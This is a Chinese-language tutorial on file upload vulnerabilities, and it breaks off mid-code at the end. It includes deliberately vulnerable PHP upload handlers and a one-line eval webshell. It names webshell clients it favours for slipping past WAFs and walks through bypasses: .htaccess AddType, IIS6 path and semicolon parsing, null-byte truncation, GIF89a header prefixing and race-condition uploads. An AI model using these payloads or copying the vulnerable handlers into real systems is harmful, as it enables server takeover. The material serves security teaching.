<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$operateId</span> == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable">$date</span> = date(<span class="string">"Ymd"</span>);</span><br><span class="line">    <span class="variable">$dest</span> = <span class="variable">$CONFIG</span>-&gt;basePath.<span class="string">"data/files/"</span>.<span class="variable">$date</span>.<span class="string">"/"</span>;</span><br><span class="line">    <span class="variable">$COMMON</span>-&gt;createDir(<span class="variable">$dest</span>);</span><br><span class="line">    <span class="regexp">//i</span>f (!is_dir(<span class="variable">$dest</span>))   mkdir(<span class="variable">$dest</span>, <span class="number">0777</span>);</span><br><span class="line">    <span class="variable">$nameExt</span> = strtolower(<span class="variable">$COMMON</span>-&gt;getFileExtName(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'name'</span>]));</span><br><span class="line">    <span class="variable">$allowedType</span> = array(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'bmp'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$nameExt</span>, <span class="variable">$allowedType</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(empty(<span class="variable">$msg</span>))&#123;</span><br><span class="line">        <span class="variable">$filename</span> = getmicrotime().<span class="string">'.'</span>.<span class="variable">$nameExt</span>;</span><br><span class="line">        <span class="variable">$file_url</span> = urlencode(<span class="variable">$CONFIG</span>-&gt;baseUrl.<span class="string">'data/files/'</span>.<span class="variable">$date</span>.<span class="string">"/"</span>.<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$dest</span>.<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span>(empty(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'error'</span>]))&#123;</span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'Filedata'</span>][<span class="string">'tmp_name'</span>],<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="regexp">//</span><span class="variable">$msg</span> = <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="variable">$file_url</span>;</span><br><span class="line">            @chmod(<span class="variable">$filename</span>, <span class="number">0444</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$outMsg</span> = <span class="string">"fileUrl="</span>.<span class="variable">$msg</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">"eoutmsg"</span>] = <span class="variable">$outMsg</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="文件上传漏洞的利用"><a href="#文件上传漏洞的利用" class="headerlink" title="文件上传漏洞的利用"></a>文件上传漏洞的利用</h4><p>​        这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p>
<ul>
<li>上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行；</li>
<li>上传文件是WebShell时，攻击者可通过这些网页后门执行命令并控制服务器；</li>
<li>上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击；</li>
<li>上传文件是恶意图片时，图片中可能包含了脚本，加载或者点击这些图片时脚本会悄无声息的执行；</li>
<li>上传文件是伪装成正常后缀的恶意脚本时，攻击者可借助本地文件包含漏洞(Local File Include)执行该文件。如将bad.php文件改名为bad.doc上传到服务器，再通过PHP的include，include_once，require，require_once等函数包含执行。</li>
</ul>
<h5 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h5><p>Webshell:大马、小马</p>
<ul>
<li>大马：代码量多，功能多</li>
<li>小马：代码量少，功能也少</li>
</ul>
<p>例如：一句话木马<?php eval($_POST[‘a’]); ?>    单引号可不加，只能接受php代码</p>
<p><strong>菜刀种类</strong></p>
<ul>
<li>中国菜刀：基本都有后门，强烈不推荐使用</li>
<li>cknife（C刀）：一般</li>
<li>蚁剑：js开发，中国菜刀js版，推荐使用，github有</li>
<li>冰蝎：自带加密，木马没有特征，极力推荐使用，github有</li>
<li>k8飞刀：推荐使用，工具多</li>
</ul>
<p>什么时候用大马？什么时候用小马？什么时候用过狗马？</p>
<ul>
<li>过狗小马：冰蝎小马</li>
<li>过狗大马：过狗大马</li>
<li>遇到安全狗，直接上大马，不考虑小马，原因：菜刀流量特征明显，而大马是正常文件正常访问。小马才需要菜刀连接，大马不需要。</li>
</ul>
<h4 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h4><p>条件竞争漏洞,</p>
<p>接着看下面这段代码(摘自某VPN系统)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!php</span></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'realfile'</span>])&#123;</span><br><span class="line">    copy($_POST[<span class="string">'realfile'</span>],$_POST[<span class="string">'path'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">$file = mb_convert_encoding($_POST[file],<span class="string">"GBK"</span>,<span class="string">"UTF-8"</span>);</span><br><span class="line">header(<span class="string">"Pragma:"</span>);</span><br><span class="line">header(<span class="string">"Cache-Control:"</span>);</span><br><span class="line">header(<span class="string">"Content-type:application/octet-stream"</span>);</span><br><span class="line">header(<span class="string">"Content-Length:"</span>.filesize($_POST[path]));</span><br><span class="line">header(<span class="string">"Content-Disposition:attachment;filename=\"$file\""</span>);</span><br><span class="line">readfile($_POST[path]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'realfile'</span>])&#123;</span><br><span class="line">    unlink($_POST[<span class="string">"path"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上述代码的逻辑表面上看起来是这样的(对于攻击者来说)：</p>
<p>利用copy函数，将realfile生成shell.php-→删除掉shell.php</p>
<p>这样初看起来没办法利用，但是仔细一想, 这段代码其实是存在逻辑问题的，所以我们可以利用这个逻辑缺陷达到GetShell的目的。</p>
<p>具体利用方法：</p>
<p>copy成temp.php–&gt;不断访问temp.php-&gt;temp.php生成shell.php-&gt;删除temp.php</p>
<h4 id="校验方式分类-amp-总结"><a href="#校验方式分类-amp-总结" class="headerlink" title="校验方式分类&amp;总结"></a>校验方式分类&amp;总结</h4><ul>
<li>客户端javascript校验（一般只校验后缀名）</li>
<li>服务端校验</li>
<li>文件头content-type字段校验（image/gif）</li>
<li>文件内容头校验（GIF89a）</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
<li>自定义正则校验</li>
<li>WAF设备校验（根据不同的WAF产品而定）</li>
</ul>
<h4 id="校验方式溯源"><a href="#校验方式溯源" class="headerlink" title="校验方式溯源"></a>校验方式溯源</h4><p>​    通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/523aeb43-b1a1-421b-b809-79ec1bdb06f8.png-w331s" alt="img"></p>
<h4 id="校验方式-amp-绕过姿势"><a href="#校验方式-amp-绕过姿势" class="headerlink" title="校验方式&amp;绕过姿势"></a>校验方式&amp;绕过姿势</h4><h5 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h5><p>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。当WebDAV开启PUT，MOVE，COPY，DELETE方法时，攻击者就可以向服务器上传危险脚本文件。</p>
<p>此时可以使用OPTIONS探测服务器支持的http方法，如果支持PUT，就进行上传脚本文件，在通过MOVE或COPY方法改名。当开启DELETE时还可以删除文件。</p>
<p>参考:<a href="http://wiki.wooyun.org/server:httpput" target="_blank" rel="noopener">http://wiki.wooyun.org/server:httpput</a></p>
<h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><h5 id="JavaScript校验"><a href="#JavaScript校验" class="headerlink" title="JavaScript校验"></a>JavaScript校验</h5><p>验证代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//文件上传漏洞演示脚本之js验证</span></span><br><span class="line">$uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($uploaddir)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upfile'</span>][<span class="string">'tmp_name'</span>], $uploaddir . <span class="string">'/'</span> . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            echo <span class="string">'文件上传成功，保存于：'</span> . $uploaddir . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>] . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        exit($uploaddir . <span class="string">'文件夹不存在,请手工创建！'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//print_r($_FILES);</span></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></span><br><span class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</span><br><span class="line">    &lt;title&gt;文件上传漏洞演示脚本--JS验证实例&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">    &lt;script type="text/</span>javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">       function checkFile() &#123;</span></span><br><span class="line"><span class="string">            var file = document.getElementsByName('upfile')[0].value;</span></span><br><span class="line"><span class="string">            if (file == null || file == "</span><span class="string">") &#123;</span></span><br><span class="line"><span class="string">                alert("</span>你还没有选择任何文件，不能上传!<span class="string">");</span></span><br><span class="line"><span class="string">                return false;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            //定义允许上传的文件类型</span></span><br><span class="line"><span class="string">            var allow_ext = "</span>.jpg|.jpeg|.png|.gif|.bmp|<span class="string">";</span></span><br><span class="line"><span class="string">            //提取上传文件的类型</span></span><br><span class="line"><span class="string">            var ext_name = file.substring(file.lastIndexOf("</span>.<span class="string">"));</span></span><br><span class="line"><span class="string">            //alert(ext_name);</span></span><br><span class="line"><span class="string">            //alert(ext_name + "</span>|<span class="string">");</span></span><br><span class="line"><span class="string">            //判断上传文件类型是否允许上传</span></span><br><span class="line"><span class="string">            if (allow_ext.indexOf(ext_name + "</span>|<span class="string">") == -1) &#123;</span></span><br><span class="line"><span class="string">                var errMsg = "</span>该文件不允许上传，请上传<span class="string">" + allow_ext + "</span>类型的文件,当前文件类型为：<span class="string">" +     ext_name;</span></span><br><span class="line"><span class="string">                alert(errMsg);</span></span><br><span class="line"><span class="string">                return false;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;h3&gt;文件上传漏洞演示脚本--JS验证实例&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&lt;form action="</span><span class="string">" method="</span>post<span class="string">" enctype="</span>multipart/form-data<span class="string">" name="</span>upload<span class="string">" onsubmit="</span><span class="keyword">return</span>     checkFile()<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;input type="</span>hidden<span class="string">" name="</span>MAX_FILE_SIZE<span class="string">" value="</span><span class="number">204800</span><span class="string">"/&gt;</span></span><br><span class="line"><span class="string">    请选择要上传的文件：&lt;input type="</span>file<span class="string">" name="</span>upfile<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">    &lt;input type="</span>submit<span class="string">" name="</span>submit<span class="string">" value="</span>上传<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>客户端JS验证通常做法是验证上传文件的扩展名是否符合验证条件</p>
<h5 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h5><p>1.通过firefox的F12修改js代码绕过验证 2.使用burp抓包直接提交，绕过js验证</p>
<h4 id="服务器端校验"><a href="#服务器端校验" class="headerlink" title="服务器端校验"></a>服务器端校验</h4><h5 id="文件头content-type字段校验（服务端MIME类型检测）"><a href="#文件头content-type字段校验（服务端MIME类型检测）" class="headerlink" title="文件头content-type字段校验（服务端MIME类型检测）"></a>文件头content-type字段校验（服务端MIME类型检测）</h5><h5 id="MIME类型介绍"><a href="#MIME类型介绍" class="headerlink" title="MIME类型介绍"></a>MIME类型介绍</h5><p><strong>MIME type</strong>的缩写为<strong>(Multipurpose Internet Mail Extensions)</strong>代表互联网媒体类型(Internet media type)，MIME使用一个简单的字符串组成，最初是为了标识邮件Email附件的类型，在html文件中可以使用content-type属性表示，描述了文件类型的互联网标准。</p>
<p>Internet中有一个专门组织IANA来确认标准的MIME类型，但Internet发展的太快，很多应用程序等不及IANA来确认他们使用的MIME类型为标准类型。因此他们使用在类别中以x-开头的方法标识这个类别还没有成为标准，例如：x-gzip，x-tar等。事实上这些类型运用的很广泛，已经成为了事实标准。只要客户机和服务器共同承认这个MIME类型，即使它是不标准的类型也没有关系，客户程序就能根据MIME类型，采用具体的处理手段来处理数据。</p>
<p>Response对象通过设置ContentType使客户端浏览器，区分不同种类的数据，并根据不同的MIME调用浏览器内不同的程序嵌入模块来处理相应的数据。</p>
<h6 id="MIME类型格式："><a href="#MIME类型格式：" class="headerlink" title="MIME类型格式："></a>MIME类型格式：</h6><p>类别/子类别;参数 Content-Type: [type]/[subtype]; parameter</p>
<h6 id="MIME主类别："><a href="#MIME主类别：" class="headerlink" title="MIME主类别："></a>MIME主类别：</h6><p>text：用于标准化地表示的文本信息，文本消息可以是多种字符集和或者多种格式的；</p>
<p>Multipart：用于连接消息体的多个部分构成一个消息，这些部分可以是不同类型的数据；</p>
<p>Application：用于传输应用程序数据或者二进制数据；</p>
<p>Message：用于包装一个E-mail消息；</p>
<p>Image：用于传输静态图片数据；</p>
<p>Audio：用于传输音频或者音声数据；</p>
<p>Video：用于传输动态影像数据，可以是与音频编辑在一起的视频数据格式。</p>
<h6 id="常见MIME类型："><a href="#常见MIME类型：" class="headerlink" title="常见MIME类型："></a>常见MIME类型：</h6><p><img src="https://images.seebug.org/content/images/2018/04/8a4f633f-06eb-45e2-b4ba-6b064755e12e.png-w331s" alt="img"></p>
<h5 id="验证代码"><a href="#验证代码" class="headerlink" title="验证代码"></a>验证代码</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_FILE[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)&#123; <span class="comment">//检测content-type</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,we only allow uploading GIF images"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload success!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上是一个简单的服务器上传验证代码，只要content-type符合image/gif就允许上传</p>
<h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>使用Burp截取上传数据包，修改Content-Type的值，改为image/gif即可成功绕过上传webshell</p>
<h4 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h4><h5 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$type = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php3"</span>);</span><br><span class="line"><span class="comment">//判断上传文件类型</span></span><br><span class="line">$fileext = fileext($_FILE[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span>(!in_array($fileext,$type))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"upload success!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>默认上传后的文件保存的名字是已获取到的名字</p>
<h5 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h5><h6 id="配合Apache的-htaccess文件上传解析漏洞"><a href="#配合Apache的-htaccess文件上传解析漏洞" class="headerlink" title="配合Apache的.htaccess文件上传解析漏洞"></a>配合Apache的.htaccess文件上传解析漏洞</h6><blockquote>
<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</p>
</blockquote>
<p>有些服务器在上传认证时没有拦截.htaccess文件上传，就会造成恶意用户利用上传.htaccess文件解析漏洞，来绕过验证进行上传WEBShell，从而达到控制网站服务器的目的。</p>
<p>首先我们编写一个.htaccess文件。打开记事本，编写代码“AddType application/x-httpd-php .jpg”，然后点击文件选中另存为，编写文件名为.htaccess，选择保存类型为所有文件。然后将其进行上传。因为.htaccess是apache服务器中的一个配置文件,不在上传的文件的黑名单之内,所以.htaccess文件是可以上传成功。</p>
<p>接下来我们制造一个一句话木马文件，如取名为yijuhua.php。因为之前上传成功到服务器的.htaccess文件里的代码可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们把yijuhua.php文件的后缀名改为.jpg格式,让.htaccess文件解析yijuhua.jpg文件里的php代码，从而使木马上传成功并达到可执行的目的。</p>
<h6 id="Apache站上的解析缺陷绕过上传漏洞"><a href="#Apache站上的解析缺陷绕过上传漏洞" class="headerlink" title="Apache站上的解析缺陷绕过上传漏洞"></a>Apache站上的解析缺陷绕过上传漏洞</h6><p>Apache的解析漏洞主要特性为Apache是从后面开始检查后缀，按最后一个合法后缀执行，整个漏洞的关键就是Apache的合法后缀到底是哪些，不是合法后缀的都可以被利用，所以将木马的后缀进行修改为允许上传的类型后，即可成功绕过验证，最终拿到权限。</p>
<p>例如新建完要上传的一句话木马文件后命名为yijuhua.php，然后我们在文件后缀处添加上7z，就有可能绕过验证上传成功。也可以修改后缀名为cab、zip、bmp等，只要是允许的上传类型都可能被上传成功。最后通过菜刀类工具访问即可。</p>
<h6 id="IIS6-0站上的目录路径检测解析绕过上传漏洞"><a href="#IIS6-0站上的目录路径检测解析绕过上传漏洞" class="headerlink" title="IIS6.0站上的目录路径检测解析绕过上传漏洞"></a>IIS6.0站上的目录路径检测解析绕过上传漏洞</h6><p>当我们使用的服务器都是Windows2003，并且使用的服务为IIS6.0时，就可能存在如本节所描述的漏洞。</p>
<p>以asp为例，先准备好一句话木马文件，然后通过burpsuite进行抓包：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/6dd812e6-eb1e-417b-96bd-d5f2e28b9aff.png-w331s" alt="img"></p>
<p>查看数据包：</p>
<p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 uploadimg/改为<code>uploadimg/1.asp/;</code>，<code>filename=&quot;yijuhua.asp&quot;</code>修改为<code>filename=&quot;yijuhua.asp/1.jpg&quot;</code>。如图：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/5b991dc4-d954-4d9c-8c9f-78c664b46bb2.png-w331s" alt="img"></p>
<p>本例的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“yijuhua.asp/1.jpg”</code>，也同样会被IIS当作ASP文件来解析并执行。</p>
<p>首先我们请求<code>/yijuhua.asp/1.jpg</code>，服务器会从头部查找查找”.”号,获得.asp/1.jpg。然后查找”/“,如果有则内存截断，所以<code>/yijuhua.asp/1.jpg</code>会当做<code>/yijuhua.asp</code>进行解析。</p>
<p>上传成功后，通过response我们可以查看到得到的文件名信息为“1.asp;14127900008.asp”，那么就可以在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.asp;14127900008.asp”</code>，并通过菜刀类的工具进行访问了。</p>
<h6 id="IIS6-0站上的解析缺陷绕过上传漏洞"><a href="#IIS6-0站上的解析缺陷绕过上传漏洞" class="headerlink" title="IIS6.0站上的解析缺陷绕过上传漏洞"></a>IIS6.0站上的解析缺陷绕过上传漏洞</h6><p>此类方法与上面讲的目录解析有点类似，不同点在于是利用文件解析来达到绕过上传的目的。</p>
<p>以php为例，同样是准备好一句话木马文件后通过burpsuite进行抓包。</p>
<p>查看数据包：</p>
<p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 <code>uploadimg/</code> 改为 <code>uploadimg/1.php;</code> ，<code>filename=&quot;yijuhua.php&quot;</code>修改为<code>filename=&quot;yijuhua.jpg&quot;</code>。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/e1c080a6-7aea-4e60-b007-20541c72db62.png-w331s" alt="img"></p>
<p>本例中的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“1.php;yijuhua.jpg”</code>，也同样会被IIS当作PHP文件来解析并执行</p>
<p>首先我们请求<code>/1.php;yijuhua.jpg</code>，然后服务器会从头部查找查找”.”号,获得<code>.php;yijuhua.jpg</code>。接着查找到”;”，有则内存截断，所以<code>/1.php;yijuhua.jpg</code>会当做/1.php进行解析。</p>
<p>最后类似上一节那样，通过response我们可以查看到得到的文件名信息为<code>“1.php;14127900008.php”</code>，在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.php;14127900008.php”</code>，并通过菜刀类的工具进行访问。</p>
<p>1.使用大小写绕过（针对对大小写不敏感的系统如windows），如：PhP</p>
<p>2.使用黑名单外的脚本类型，如：php5,asa 和 cer等(IIS默认支持解析.asp,.cdx, .asa,.cer等)</p>
<p>能被解析的文件扩展名列表：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">jsp </span><span class="keyword">jspx </span><span class="keyword">jspf</span></span><br><span class="line"><span class="keyword">asp </span>asa cer aspx</span><br></pre></td></tr></table></figure>

<p>3.配合操作系统文件命令规则</p>
<p>（1）上传不符合windows文件命名规则的文件名</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">   　　<span class="keyword">test</span>.asp.</span><br><span class="line">   　　<span class="keyword">test</span>.asp(空格)</span><br><span class="line">   　　<span class="keyword">test</span>.php:1.jpg</span><br><span class="line">   　　<span class="keyword">test</span>.php:: <span class="variable">$DATA</span></span><br></pre></td></tr></table></figure>

<p>会被windows系统自动去掉不符合规则符号后面的内容。</p>
<p>（2）linux下后缀名大小写</p>
<p>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
<p>(3)借助系统特性突破扩展名验证，如：test.php_(在windows下,下划线是空格，保存文件时下划线被吃掉剩下test.php)</p>
<p>4.双扩展名之间使用00截断，绕过验证上传恶意代码</p>
<p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">   　　test.php(<span class="number">0x00</span>).jpg</span><br><span class="line">   　　test.php%<span class="number">00.</span>jpg</span><br><span class="line">   　　路径/upload/<span class="number">1.</span>php(<span class="number">0x00</span>)，文件名<span class="number">1.</span>jpg，结合/upload/<span class="number">1.</span>php(<span class="number">0x00</span>)/<span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>

<p>5.超长文件名截断上传(windows 258byte | linux 4096byte)</p>
<h4 id="服务端检测文件内容"><a href="#服务端检测文件内容" class="headerlink" title="服务端检测文件内容"></a>服务端检测文件内容</h4><h5 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h5><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
<p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p>
<p>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</p>
<p>（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?></p>
<p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP    </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(<span class="string">"上传的txt文件路径"</span>);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">#ASP    </span></span><br><span class="line">&lt;!--<span class="comment">#include file="上传的txt文件路径" --&gt;</span></span><br><span class="line"><span class="comment">#JSP    </span></span><br><span class="line">&lt;jsp:inclde page=<span class="string">"上传的txt文件路径"</span>/&gt;</span><br><span class="line"><span class="keyword">or</span>  </span><br><span class="line">&amp;lt;%@<span class="keyword">include</span> file=<span class="string">"上传的txt文件路径"</span>%&gt;</span><br></pre></td></tr></table></figure>

<p>详细参考：<a href="http://thief.one/2017/04/10/2/" target="_blank" rel="noopener">文件包含漏洞(绕过姿势)</a></p>
<h5 id="利用PHP特性（使用数组绕过）"><a href="#利用PHP特性（使用数组绕过）" class="headerlink" title="利用PHP特性（使用数组绕过）"></a>利用PHP特性（使用数组绕过）</h5><p><img src="https://images.seebug.org/content/images/2018/04/1bb9ff63-9b8c-415e-bc9a-69f843b97ee5.png-w331s" alt="img"></p>
<p>file_put_contents 这个函数的第二个参数 可以是数组</p>
<p>然后 如果代码里用正则匹配 bad word 的时候</p>
<p>对一个数组进行正则匹配没用</p>
<h4 id="服务端检测文件头"><a href="#服务端检测文件头" class="headerlink" title="服务端检测文件头"></a>服务端检测文件头</h4><h5 id="文件头简介"><a href="#文件头简介" class="headerlink" title="文件头简介"></a>文件头简介</h5><p>不同的图片文件都有不同文件头，如：</p>
<p>PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A</p>
<p>JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)</p>
<p>GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61</p>
<p>PHP使用getimagesize函数验证图片文件头</p>
<h5 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>绕过这个检测只需要在恶意脚本前加上允许上传文件的头标识就可以了</p>
<p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="上传到服务端后验证"><a href="#上传到服务端后验证" class="headerlink" title="上传到服务端后验证"></a>上传到服务端后验证</h4><h5 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h5><p>演示代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">"./"</span>;</span><br><span class="line"></span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span 